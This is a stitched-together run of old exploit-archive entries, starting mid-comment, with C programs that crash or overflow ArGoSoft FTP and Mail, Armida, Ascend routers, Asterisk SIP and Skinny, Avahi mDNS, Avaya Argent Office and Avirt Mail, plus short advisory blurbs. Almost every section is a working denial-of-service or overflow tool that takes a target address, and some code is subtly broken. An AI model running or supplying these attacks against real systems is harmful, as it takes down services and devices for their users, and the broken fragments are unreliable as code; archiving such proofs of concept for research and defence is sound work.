  wont crash but it shows that it has beed overflowed . but the program maker
  doesnt think there are people who can do wiser job ! well there is a way to 
  get shell.I just mention it.the code below is just show that the server is vuln.
  we can overwrite eip with a nullbyte without sending a null !!!
  so think there is a jmp call pop push register is around 004400E1 (for example)
  so we can directly jmp to anywhere we want . anyway if u want u can try .
  compiled with visual c++ 6 : cl argo.c
  greetz : LorD and NT of IHSTeam,Jamie of exploitdev,simorgh-ev,PiShi,redhat
  sIiiS and vahid,str0ke (milw0rm),roberto (zone-h),securiteam,and other friends .
  Congratulate new iran irc server irc.iraneman.org #iran #ihs 
  and new site www.ihsteam.com 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define size 290 // enough for overflowing play with it for more result
                           

 int main (int argc, char *argv[]){

  unsigned char *recvbuf,*user,*pass;
  unsigned int rc,addr,sock ;
  struct sockaddr_in tcp;
  struct hostent *hp;
  WSADATA wsaData;
  char buffer[size];
  unsigned short port;

  int i;
  if(argc < 5) {
      printf("\n-------- ArGoSoft Ftp remote exploit by c0d3r --------\n");
   printf("-------- usage : argo.exe host port user pass --------\n");
   printf("-------- eg: argo.exe 127.0.0.1 21 c0d3r secret --------\n\n");
  exit(-1) ;
  }
  printf("\n-------- ArGoSoft Ftp remote exploit by c0d3r --------\n\n");
  recvbuf = malloc(256);
  memset(recvbuf,0,256);
  
  //Creating exploit code
  printf("[+] building overflow string");
    memset(buffer,0,size);

   buffer[0] = 'D';buffer[1] = 'E';buffer[2] = 'L';buffer[3]='E'; buffer[4]= 0x20;
   for(i = 5;i != 286;i++){
   buffer[i] = 'A';
  }
 //EO exploit code

  user = malloc(256);
  memset(user,0,256);

  pass = malloc(256);
  memset(pass,0,256);

  sprintf(user,"user %s\r\n",argv[3]);
  sprintf(pass,"pass %s\r\n",argv[4]);
  
   if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){
   printf("[-] WSAStartup failed !\n");
   exit(-1);
  }
 hp = gethostbyname(argv[1]);
  if (!hp){
   addr = inet_addr(argv[1]);
  }
  if ((!hp) && (addr == INADDR_NONE) ){
   printf("[-] unable to resolve %s\n",argv[1]);
   exit(-1);
  }
  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if (!sock){
   printf("[-] socket() error...\n");
   exit(-1);
  }
   if (hp != NULL)
   memcpy(&(tcp.sin_addr),hp->h_addr,hp->h_length);
  else
   tcp.sin_addr.s_addr = addr;

  if (hp)
   tcp.sin_family = hp->h_addrtype;
  else
  tcp.sin_family = AF_INET;
  port=atoi(argv[2]);
  tcp.sin_port=htons(port);
   
  
  printf("\n[+] attacking host %s\n" , argv[1]) ;
  
  Sleep(1000);
  
  printf("[+] packet size = %d byte\n" , sizeof(buffer));
  
  rc=connect(sock, (struct sockaddr *) &tcp, sizeof (struct sockaddr_in));
  if(rc==0)
  {
    
     Sleep(1000) ;
  printf("[+] connected\n") ;
     rc2=recv(sock,recvbuf,256,0);
     printf("[+] sending username\n");
     send(sock,user,strlen(user),0);
     send(sock,'\n',1,0);
     printf("[+] sending passworld\n");
     Sleep(1000);  
	 send(sock,pass,strlen(pass),0);
     send(sock,'\n',1,0);
     Sleep(1000);
	 send(sock,buffer,strlen(buffer),0);
	 send(sock,'\n',1,0);
	 printf("[+] string sent successfully check the main window for result\n");
  }
  
  else {
      printf("[-] ArGo is not listening .... \n");
 }
  shutdown(sock,1);
  closesocket(sock);
 
}

// milw0rm.com [2005-04-03]
source: http://www.securityfocus.com/bid/7873/info

ArGoSoft Mail Server has been reported prone to a denial of service condition when handling multiple GET requests, in rapid succession.

An attacker may exploit this condition to effectively deny service to legitimate ArGoSoft Mail server users until the service is restarted.

/**********************************************************************************
*
*     Denial of Service Attack against ArGoSoft Mail Server Version 1.8
(1.8.3.5)
*
*    Tripbit Security Development
*    ---------------------------------
*
*    Author: posidron
*
*    Contact
*    [-] Mail: posidron@tripbit.org
*    [-] Web: http://www.tripbit.org
*    [-] Forum: http://www.tripbit.org/wbboard
*    [-] IRC: irc.euirc.net 6667 #tripbit
*
*    Greets: Rushjo, Tec, STeFaN, Havoc][, MisterMoe, PeaceTreaty
*
**********************************************************************************/

#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    int port, sockfd;
    struct sockaddr_in server;
    struct hostent *host;
    char sendstring[1024];

    strcpy(sendstring, "GET  /index.html HTTP/1.0\n\n");

    if(argc < 3)
    {
        printf("Usage: %s [target] <port>\n", argv[0]);
        exit(0);
    }

    port = atoi(argv[2]);

    host = gethostbyname(argv[1]);
    if(host == NULL)
    {
        printf("Connection failed!...\n");
        exit(0);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr((char*)argv[1]);

    printf("Dos against ArGoSoft Mail Server Version 1.8 (1.8.3.5)\n");

    for(;;)
    {
        if( (sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0)
        {
            printf("socket() failed!\n");
            exit(0);
        }

        if(connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0)
        {
            printf("connect() failed!\n");
            close(sockfd);
        }

        if (write(sockfd, sendstring, strlen(sendstring)) < 0)
        {
            break;
        }

        close(sockfd);
    }

    printf("Attack done!...\n");
}
source: http://www.securityfocus.com/bid/8017/info

Armida Databased Web Server is reportedly prone to a remote denial of service when process malicious GET requests. The problem occurs when processing requests containing excessive data.

Exploitation of this vulnerability would result in the remote service crashing. 
Although unconfirmed, due to the nature of this vulnerability it may be possible to supply and execute arbitrary code.

/**************************************************************
*
*     Denial of Service Attack against Armida Web Server v1.0
*    *    Tripbit Security Development
*    ----------------------------
*
*    Author: posidron
*
*    Contact
*    [-] Mail: posidron@tripbit.org
*    [-] Web: http://www.tripbit.org
*    [-] Forum: http://www.tripbit.org/wbboard
*    [-] IRC: irc.euirc.net 6667 #tripbit
*
*    Greets: #csec, #securecrew, #tripbit
*
**************************************************************/

#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    int port, sockfd;
    struct sockaddr_in server;
    struct hostent *host;
       char send[6915], flood[6900];
    char get[3] = "GET", http[12] = "HTTP/1.0\n\n";
       memset(flood, 'A', 6900);
       strcpy(send, get);
    strcat(send, flood);
    strcat(send, http);

    if(argc < 3)
    {
        printf("Usage: %s [target] <port>\n", argv[0]);
        exit(0);
    }

    port = atoi(argv[2]);

    host = gethostbyname(argv[1]);
    if(host == NULL)
    {
        printf("Connection failed!...\n");
        exit(0);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr((char*)argv[1]);

    printf("DoS against Armida v1.0\n");

    if( (sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0)
    {
        printf("Can't start socket()!\n");
        exit(0);
    }
       if(connect(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0)
    {
        printf("Can't connect!\n");
        exit(0);
    }
       write(sockfd, send, strlen(send));
       printf("Attack done!...\n");
       close(sockfd);
}
source: http://www.securityfocus.com/bid/1855/info

A vulnerability exists in the operating system of some Ascend routers. If an invalid TCP packet (of zero length) is sent to the administration port of Ascend Routers 4.5Ci12 or earlier, the result will be a crash and reboot of the attacked router, accomplishing a denial of service attack.

Note that 3Com is reportedly also vulnerable, but it is not verified which versions of IOS are exploitable.


                    /* Update, 3/20/98: Ascend has released 5.0Ap46 which corrects this bug.
                     * see ftp.ascend.com.
                     */
                     
                    /*
                     * Ascend Kill II - C version
                     *
                     * (C) 1998 Rootshell - http://www.rootshell.com/
                     *
                     * Released: 3/16/98
                     *
                     * Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues
                     * (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html)
                     *
                     * Sends a specially constructed UDP packet on the discard port (9)
                     * which cause Ascend routers to reboot.  (Warning! Ascend routers will
                     * process these if they are broadcast packets.)
                     *
                     * Compiled under RedHat 5.0 with glibc.
                     *
                     * NOTE: This program is NOT to be used for malicous purposes.  This is
                     *       intenteded for educational purposes only.  By using this program
                     *       you agree to use this for lawfull purposes ONLY.
                     *
                     * It is worth mentioning that Ascend has known about this bug for quite
                     * some time.
                     *
                     * Fix:
                     *
                     * Filter inbound UDP on port 9.
                     *
                     */

                    #include <stdio.h>
                    #include <stdlib.h>
                    #include <string.h>
                    #include <unistd.h>
                    #include <sys/types.h>
                    #include <sys/socket.h>
                    #include <netinet/in.h>
                    #include <netinet/in_systm.h>
                    #include <netinet/ip.h>
                    #include <linux/udp.h>
                    #include <netdb.h>

                    #define err(x) { fprintf(stderr, x); exit(1); }
                    #define errs(x, y) { fprintf(stderr, x, y); exit(1); }

                    /* This magic packet was taken from the Java Configurator */
                    char ascend_data[] =
                      {
                        0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 0x81, 0x00, 0x00,
                        0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                        0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e,
                        0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 0x41, 0x53, 0x53,
                        0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44,
                        0x50, 0x41, 0x53, 0x53};


                    unsigned short 
                    in_cksum (addr, len)
                         u_short *addr;
                         int len;
                    {
                      register int nleft = len;
                      register u_short *w = addr;
                      register int sum = 0;
                      u_short answer = 0;

                      while (nleft > 1)
                        {
                          sum += *w++;
                          nleft -= 2;
                        }
                      if (nleft == 1)
                        {
                          *(u_char *) (&answer) = *(u_char *) w;
                          sum += answer;
                        }

                      sum = (sum >> 16) + (sum & 0xffff);
                      sum += (sum >> 16);
                      answer = ~sum;
                      return (answer);
                    }

                    int 
                    sendpkt_udp (sin, s, data, datalen, saddr, daddr, sport, dport)
                         struct sockaddr_in *sin;
                         unsigned short int s, datalen, sport, dport;
                         unsigned long int saddr, daddr;
                         char *data;
                    {
                      struct iphdr ip;
                      struct udphdr udp;
                      static char packet[8192];
                      char crashme[500];
                      int i;

                      ip.ihl = 5;
                      ip.version = 4;
                      ip.tos = rand () % 100;;
                      ip.tot_len = htons (28 + datalen);
                      ip.id = htons (31337 + (rand () % 100));
                      ip.frag_off = 0;
                      ip.ttl = 255;
                      ip.protocol = IPPROTO_UDP;
                      ip.check = 0;
                      ip.saddr = saddr;
                      ip.daddr = daddr;
                      ip.check = in_cksum ((char *) &ip, sizeof (ip));
                      udp.source = htons (sport);
                      udp.dest = htons (dport);
                      udp.len = htons (8 + datalen);
                      udp.check = (short) 0;
                      memcpy (packet, (char *) &ip, sizeof (ip));
                      memcpy (packet + sizeof (ip), (char *) &udp, sizeof (udp));
                      memcpy (packet + sizeof (ip) + sizeof (udp), (char *) data, datalen);
                      /* Append random garbage to the packet, without this the router
                         will think this is a valid probe packet and reply. */
                      for (i = 0; i < 500; i++)
                        crashme[i] = rand () % 255;
                      memcpy (packet + sizeof (ip) + sizeof (udp) + datalen, crashme, 500);
                      return (sendto (s, packet, sizeof (ip) + sizeof (udp) + datalen + 500, 0,
                                      (struct sockaddr *) sin, sizeof (struct sockaddr_in)));
                    }

                    unsigned int 
                    lookup (host)
                         char *host;
                    {
                      unsigned int addr;
                      struct hostent *he;

                      addr = inet_addr (host);
                      if (addr == -1)
                        {
                          he = gethostbyname (host);
                          if ((he == NULL) || (he->h_name == NULL) || (he->h_addr_list == NULL))
                            return 0;

                          bcopy (*(he->h_addr_list), &(addr), sizeof (he->h_addr_list));
                        }
                      return (addr);
                    }

                    void
                    main (argc, argv)
                         int argc;
                         char **argv;
                    {
                      unsigned int saddr, daddr;
                      struct sockaddr_in sin;
                      int s, i;

                      if (argc != 3)
                        errs ("Usage: %s <source_addr> <dest_addr>\n", argv[0]);

                      if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
                        err ("Unable to open raw socket.\n");
                      if (!(saddr = lookup (argv[1])))
                        err ("Unable to lookup source address.\n");
                      if (!(daddr = lookup (argv[2])))
                        err ("Unable to lookup destination address.\n");
                      sin.sin_family = AF_INET;
                      sin.sin_port = 9;
                      sin.sin_addr.s_addr = daddr;
                      if ((sendpkt_udp (&sin, s, &ascend_data, sizeof (ascend_data), saddr, daddr, 9, 9)) == -1)
                        {
                          perror ("sendpkt_udp");
                          err ("Error sending the UDP packet.\n");
                        }
                    }/*
this will cause asterisk to segfault,
the bug that this exploits has been patched in release 1.2.16  & 1.4.1

CLI>

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 1082719152 (LWP 2510)]
register_verify (p=0x81cf600, sin=0x4088e750, req=0x4088e760, uri=0x0)
    at chan_sip.c:8257
8257            while (*t && *t > ' ' && *t != ';')
(gdb) 


build:
gcc -o asterisk-sip-killer asterisk-sip-killer.c

run:
./asterisk-sip-killer -h <targethost>

*/
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/tcp.h>

#define SIP_UDP_PORT 5060

struct udp_session {	
	int sd;
	struct sockaddr_in saddr;
};

int make_udp(struct udp_session *p, char *remotehost, int port)
{
	int sd;
	int ret;
	struct sockaddr_in saddr;
	struct hostent *he;

	sd = socket(AF_INET,SOCK_DGRAM,0);

	if (sd == -1) {
		printf("error making socket\n");
		return -1;
	}

	he = gethostbyname(remotehost);
	
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);
	saddr.sin_addr.s_addr = inet_addr(remotehost);
	memset(&(saddr.sin_zero), '\0', 8);
	p->sd = sd;
	memcpy(&p->saddr,&saddr,sizeof(struct sockaddr_in));

	printf("udp socket ready\n");
	
	return 0;
}

void kill_asterisk(struct udp_session *sess)
{
	int ret;
	char *p =
		"REGISTER              \r\n"
		"Via: SIP/2.0/UDP 192.168.204.130:5060;branch=z9hG4bK1d97e14f\r\n"
		"Max-Forwards: 70\r\n"
		"From: <sip:666@192.168.204.130>;tag=as253946cf\r\n"
		"To: <sip:100@192.168.204.130>\r\n"
		"Call-ID: 7e64a49e5cf018231228938050e43d3b@127.0.0.1\r\n"
		"CSeq: 104 REGISTER\r\n"
		"User-Agent: Asterisk PBX\r\n"
		"Expires: 120\r\n"
		"Contact: <sip:666@192.168.204.130>\r\n"
		"Event: registration\r\n"
		"Content-Length: 0\r\n";

	ret = sendto(sess->sd, p, strlen(p), 0,
	       (struct sockaddr *)&sess->saddr,
	       sizeof(struct sockaddr));

	if (ret) {	
		printf("You may have well shutdown a asterisk server\n");
	} else {
		printf("there was a issue sending the request\n");
		return;
	}
	return;
}
int main(int argc, char **argv)
{
	int i = 0;
	char *r_host = NULL;
	struct udp_session *connection_out;
	

	for (i=0;i<argc;i++) {
		if (!(strcmp(argv[i],"-h"))) {
                        printf("it looks like you want a host entry\n");
                        r_host = argv[i+1];
                        printf("r_host: %s\n", r_host);
                }
        }

	if (!r_host) {
		printf("umm you forgot the -h <host> option!\n");
		return 0;
	}

	if (!(connection_out = (struct udp_session *)malloc(sizeof(struct udp_session)))) {
		printf("malloc failed your computer sucks\n");
		return 0;
	}
	make_udp(connection_out, r_host, SIP_UDP_PORT);
	kill_asterisk(connection_out);	
	free(connection_out);
	return 0;
}

// milw0rm.com [2007-03-04]
/*
 *  AstKilla2.c 
 *  gcc -o astkilla2  astkilla2.c 
 * ./astkilla2 -h 216.246.**.***
 * In no event will the author of this source be liable for any loss or damage of a material or 
 * immaterial nature arising from access to, use or non-use of published information, or from misuse of the connection or technical faults. 

			
		chan_skinny runs on 2000/TCP if you find a host with this open there is a really decent chance it's a asterisk machine some admin 
		forgot to disable chan_skinny on (which is default).. this should be a to all of those who don't lock down what they dont need (what is this 1999 ?)
				
		this is really quite old but as it turns out someone made the bug public, how sad.. but eh there are more fish in sea ;)
	        well here is a exploit for everyone who didn't take a look at the code.

		
									-- = fbff = --

*/
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/tcp.h>

#define SKINNY_TCP_PORT  2000
#define CLEN             1024
#define SKINNY_MAX_SIZE  1000
#define REGISTER_MESSAGE 0x0001
struct register_message {
	char name[16];
	uint32_t userId;
	uint32_t instance;
	uint32_t ip;
	uint32_t type;
	uint32_t maxStreams;
};
struct skinny_client {
	int sd;
	struct sockaddr_in saddr;
	int active;
	char rhost[CLEN];
	char username[CLEN];
	char password[CLEN];
	char packet[SKINNY_MAX_SIZE];
};
struct skinny_client_message {
	int len;
	int res;
	int e; /* 12 bytes */
	char *data;
};

struct skinny_client *g_sc;
struct messages {
	int e;
	char *human;
	int (* const message_handler)(struct skinny_client *sc, struct skinny_client_message *scm);
} message_list[] =  {
	{0x81,"Register Ack Message\n", NULL},
	{0x9b,"Capabilities Request Message\n",NULL},
	{0x9f,"Reset Message\n", NULL}
};
int skinny_client_read(struct skinny_client *sc)
{
	int ret;
	int elm;
	int type;
	int i;
	char buf[SKINNY_MAX_SIZE];
	struct skinny_client_message scm;
	memset(&scm,0x00,sizeof(struct skinny_client_message));
	memset(&buf,0x00,sizeof(buf));
	elm = (sizeof(message_list)/sizeof(struct messages));
	ret = read(sc->sd,&buf,sizeof(buf));
	if (ret == -1) {
		printf("+++ GOOD NEWS THE REMOTE HOST IS DEAD! READ RETURNED -1 AND THE TCP CONNECTION HAS WENT BYEBYE\n");
		return -1;
	} else if (ret < sizeof(struct skinny_client_message) - 4){
		printf("we got some data back from the server just to little of it!\n");
	} else {
		printf("++++ THINGS BROKE BUT THE HOST MAY STILL BE UP. HOW SAD\n");
	}

	return 0;
}
int skinny_client_sendmessage(struct skinny_client *sc, struct skinny_client_message *scm)
{
	int res;
	int len;
	char *outbuf;
	int test;
	
	len = 90;
	scm->len = 3;
	outbuf = malloc(len);
	if (!outbuf) {
		return -1;
	}
	memset(outbuf,0x41,len);
	/* place the 12 bytes header into outbuf */
	memcpy(outbuf,scm,12);
	/* place the data into outbuf */
	memcpy(outbuf+12,scm->data,len-12);
	res = write(sc->sd,outbuf,len);
	printf("++ Wrote %i bytes\n", res);
	return 0;
}

/* send out a client register message to the remote skinny node */
int skinny_client_register(struct skinny_client *sc)
{
	struct skinny_client_message scm;
	struct register_message *rm;
	int len;

	rm = malloc(sizeof(struct register_message )) + 4;

	if (!rm) {
		printf("we could not allocated space for the register message\n");
		return -1;
	}

	len = sizeof(struct register_message);
	scm.len  = htonl(len);
	scm.e    = htonl(REGISTER_MESSAGE);
	scm.data = (char *)rm;
	strcpy(rm->name,"SEP0007EB463101\x00");
	rm->type = 30006;
	skinny_client_sendmessage(sc,&scm);
	skinny_client_read(sc);
	return 0;
}

int skinny_client_connect(struct skinny_client *sc)
{
	int ret;
	sc->sd = socket(AF_INET,SOCK_STREAM,0);
	if (sc->sd == -1) {
		return -1;
	}
	sc->saddr.sin_family = AF_INET;
	sc->saddr.sin_port = htons(SKINNY_TCP_PORT);
	sc->saddr.sin_addr.s_addr = inet_addr(sc->rhost);
	ret = connect(sc->sd, (struct sockaddr *)&sc->saddr,sizeof(struct sockaddr));
	if (ret != 0) {
		printf("+++ UNABLE TO CONNECT TO REMOTE HOST 2000/TCP!\n");
		return -1;	
	}
	printf("+++ CONNECTION OK\n");
	sc->active = 1;
	return 0;
}

int main(int argc, char **argv)
{
		int i;
	        struct skinny_client *sc;
		pthread_attr_t attr;
		sc = malloc(sizeof(struct skinny_client));
		memset(sc,0,sizeof(struct skinny_client));
		
		for (i=0;i<argc;i++) {
			if (!strcmp(argv[i], "-h")) {
				strcpy(sc->rhost,argv[i+1]);	
			}
		}
		if (*sc->rhost == 0) {
			printf("+++ You must run with the -h option\n");
			return 0;
		}
		skinny_client_connect(sc);
		skinny_client_register(sc);

	return 0;
}

// milw0rm.com [2007-07-18]
/*
 * cve-2008-5081.c
 *
 * Avahi mDNS Daemon Remote DoS < 0.6.24
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Usage:
 *
 *   gcc cve-2008-5081.c -ldnet -o cve-2008-5081
 *   ./cve-2008-5081 1.2.3.4
 *  
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5081
 *    
 *   Crafted mDNS packet with source port 0 can cause avahi-daemon  
 *   to abort() due to failed assertion assert(port > 0); in  
 *   originates_from_local_legacy_unicast_socket() function in
 *   avahi-core/server.c.
 *
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dnet.h>
 
int
main(int argc, char **argv)
{
    ip_t *sock;
    intf_t *intf;
    struct addr dst;
    struct ip_hdr *ip;
    struct udp_hdr *udp;
    struct intf_entry entry;
    int len = IP_HDR_LEN + UDP_HDR_LEN;
    char buf[len];
 
    if (argc < 2 || addr_aton(argv[1], &dst)) {  
        printf("error: please specify a target ip address\n");
        return 1;
    }
 
    memset(buf, 0, sizeof(buf));
 
    ip = (struct ip_hdr *) buf;
    ip->ip_v = 4;
    ip->ip_hl = 5;
    ip->ip_tos = 0;
    ip->ip_off = 0;
    ip->ip_sum = 0;
    ip->ip_ttl = IP_TTL_MAX;
    ip->ip_p = IP_PROTO_UDP;
    ip->ip_id = htons(0xdead);
    ip->ip_len = htons(len);
 
    udp = (struct udp_hdr *) (buf + IP_HDR_LEN);
    
    udp->uh_sum = 0;
    udp->uh_sport = htons(0);
    udp->uh_dport = htons(5353);
    udp->uh_ulen = htons(UDP_HDR_LEN);
 
    intf = intf_open();
    intf_get_dst(intf, &entry, &dst);
    intf_close(intf);
 
    ip->ip_src = entry.intf_addr.addr_ip;
    ip->ip_dst = dst.addr_ip;
    ip_checksum(buf, len);
 
    sock = ip_open();
    if (!sock) {
        printf("error: root privileges needed for raw socket\n");
        return 1;
    }
    ip_send(sock, buf, len);
    ip_close(sock);
 
    return 0;
}

// milw0rm.com [2008-12-19]
source: http://www.securityfocus.com/bid/8976/info

It has been reported that Avaya Argent Office is prone to a denial of service condition when handling malformed DNS packets. The problem is said to occur when a DNS packet with no payload is handled. Receiving the packet is said to cause the device to reboot. 

/* argent_kill.c 
(c) 2001 Jacek Lipkowski sq5bpf acid ch pw edu pl
Reboots an Argent Office box by sending udp packets with no payload to port 53
usage: argent_kill ip_address
*/

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

main(int argc, char *argv[])
{
struct sockaddr_in addr;
struct hostent *host;
int s;

s=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if (s==-1) { perror("socket()"); exit(1); }
host=gethostbyname(argv[1]);
if (host==0) { herror("gethostbyname"); exit(1); }
memcpy(&addr.sin_addr,host->h_addr,host->h_length);
addr.sin_port=htons(53);
addr.sin_family=AF_INET;
if (connect(s,&addr,16)==-1) { perror("connect()"); exit(1); }
for (;;)
{
send(s,0,0,0); sleep(1); printf("."); fflush(stdout);
}
close(s);
}
source: http://www.securityfocus.com/bid/1825/info

Due to insufficient bounds checking in the code that handles the fields 'MAIL FROM:' and 'RCPT TO:', it is possible to remotely crash Avirt Mail.

Entering over 272 characters into the 'RCPT TO:' field will crash the application upon termination of the session and no further connections can be initiated until Avirt Mail is restarted. This is also the case with the 'MAIL FROM' field with the exception that over 556 characters must be entered.

/*
   Small piece of code demonstrating DoS vulnerability in Avirt Mail 4.0-4.2
   wersion@trust-me.com
   Win32 console code
*/
#include <mem.h>
#include <winsock.h>
#include <iostream.h>
#include <stdlib.h>

#define RCPT_SIZE 272
#define FROM_SIZE 556

struct sckssString
{
   char *szBuffer;
   int nSize;
};

char szHELO[] = "HELO anonymous";
char szMAIL[] = "MAIL FROM: ";
char szRCPT[] = "RCPT TO: ";
char szQUIT[] = "QUIT";
char szDATA[] = "DATA\nTest data\n.";

void socksenddata(int socket, sckssString* data)
{
   if(send(socket,data->szBuffer,data->nSize,NULL)!=SOCKET_ERROR)
   {
      cout << "->" << data->szBuffer << endl;
      return;
   }
   else
   {
      cout << endl << "WSA error (" << WSAGetLastError() << ")" << endl;
      exit(1);
   }
}

void socksendendline(int socket)
{
   if(send(socket,"\n",1,NULL)!=SOCKET_ERROR) return;
   else
   {
      cout << endl <<  "WSA error (" << WSAGetLastError() << ")" << endl;
      exit(1);
   }
}

void socksendanum(int socket, unsigned long int num)
{
   char *tempa = new char[num+1];
   memset(tempa,'A',num);
   tempa[num]=0;
   if(send(socket,tempa,num,NULL)!=SOCKET_ERROR)
   {
      cout << "->" << tempa << endl;
      return;
   }
   else
   {
      cout << endl <<  "WSA error (" << WSAGetLastError() << ")" << endl;
      exit(1);
   }
   delete[] tempa;
}

int main(int argv, char **argc)
{
   if(argv<3)
   {
      cout << "Usage: " << argc[0] << " ip-address type" << endl;
      cout << "Types:" << endl;
      cout << "1 - Overflow in RCPT TO: command.   (aborted session)" << endl;
      cout << "2 - Overflow in MAIL FROM: command. (aborted session)" << endl;
      cout << "3 - Overflow in RCPT TO: command.   (finnished session)" << endl;
      cout << "2 - Overflow in MAIL FROM: command. (finnished session)" << endl;
      exit(1);
   }
   WORD wVersionRequested = MAKEWORD(1,1);
   WSADATA wsaData;
   WSAStartup(wVersionRequested, &wsaData);

   SOCKADDR_IN saExploit;
   saExploit.sin_family = PF_INET;
   saExploit.sin_addr.s_addr = inet_addr(argc[1]);
   saExploit.sin_port = htons(25);

   SOCKET sckExploit = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (sckExploit == INVALID_SOCKET)
   {
      cout << "WSA error (" << WSAGetLastError() << ")" << endl;
      WSACleanup();
      return 1;
   }

   if (connect(sckExploit,(LPSOCKADDR)&saExploit,sizeof(saExploit))==SOCKET_ERROR)
   {
      cout << "WSA error (" << WSAGetLastError() << ")" << endl;
      shutdown(sckExploit,2);
      closesocket(sckExploit);
      WSACleanup();
      return 1;
   }

   sckssString sckssHelo;
   sckssHelo.nSize = strlen(szHELO);
   sckssHelo.szBuffer = new char[sckssHelo.nSize+1];
   strcpy(sckssHelo.szBuffer, szHELO);

   sckssString sckssMail;
   sckssMail.nSize = strlen(szMAIL);
   sckssMail.szBuffer = new char[sckssMail.nSize+1];
   strcpy(sckssMail.szBuffer, szMAIL);

   sckssString sckssRcpt;
   sckssRcpt.nSize = strlen(szRCPT);
   sckssRcpt.szBuffer = new char[sckssRcpt.nSize+1];
   strcpy(sckssRcpt.szBuffer, szRCPT);

   sckssString sckssQuit;
   sckssQuit.nSize = strlen(szQUIT);
   sckssQuit.szBuffer = new char[sckssQuit.nSize+1];
   strcpy(sckssQuit.szBuffer, szQUIT);

   sckssString sckssData;
   sckssData.nSize = strlen(szDATA);
   sckssData.szBuffer = new char[sckssData.nSize+1];
   strcpy(sckssData.szBuffer, szDATA);

   cout << "Beginning session..." << endl;

   switch(atoi(argc[2]))
   {
      case 1:
      {
         socksenddata(sckExploit,&sckssHelo);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssMail);
         socksendanum(sckExploit,5);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssRcpt);
         cout << "Overflowing RCPT TO:" << endl;
         socksendanum(sckExploit,RCPT_SIZE);
         socksendendline(sckExploit);

         cout << "Aborting session before data." << endl;
         socksenddata(sckExploit,&sckssQuit);
         socksendendline(sckExploit);
         break;
      }
      case 2:
      {
         socksenddata(sckExploit,&sckssHelo);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssMail);
         cout << "Overflowing MAIL FROM:" << endl;
         socksendanum(sckExploit,FROM_SIZE);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssRcpt);
         socksendanum(sckExploit,5);
         socksendendline(sckExploit);

         cout << "Aborting session before data." << endl;
         socksenddata(sckExploit,&sckssQuit);
         socksendendline(sckExploit);
         break;
      }
      case 3:
      {
         socksenddata(sckExploit,&sckssHelo);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssMail);
         socksendanum(sckExploit,5);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssRcpt);
         cout << "Overflowing RCPT TO:" << endl;
         socksendanum(sckExploit,RCPT_SIZE);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssData);
         socksendendline(sckExploit);

         cout << "Ending session." << endl;
         socksenddata(sckExploit,&sckssQuit);
         socksendendline(sckExploit);
         break;
      }
      case 4:
      {
         socksenddata(sckExploit,&sckssHelo);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssMail);
         cout << "Overflowing MAIL FROM:" << endl;
         socksendanum(sckExploit,FROM_SIZE);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssRcpt);
         socksendanum(sckExploit,5);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssData);
         socksendendline(sckExploit);

         cout << "Ending session." << endl;
         socksenddata(sckExploit,&sckssQuit);
         socksendendline(sckExploit);
         break;
      }
      default:
      {
         cout << "Type " << argc[2] << " not allowed." << endl;
         break;
      }
   }

   shutdown(sckExploit,2);
   closesocket(sckExploit);
   WSACleanup();
   cout << endl << "Ready!" << endl;
   return 0;
}


--=====================_972334194==_--source: http://www.securityfocus.com/bid/1225/info

Axent NetProwler 3.0 IDS is vulnerable to a malformed packet attack. It will crash if the Man-in-the-Middle signature encounters a packet for which the following expression is true:
(IP_HEADER_LENGTH + TCP_HEADER_LENGTH) > IP_TOTAL_LENGTH

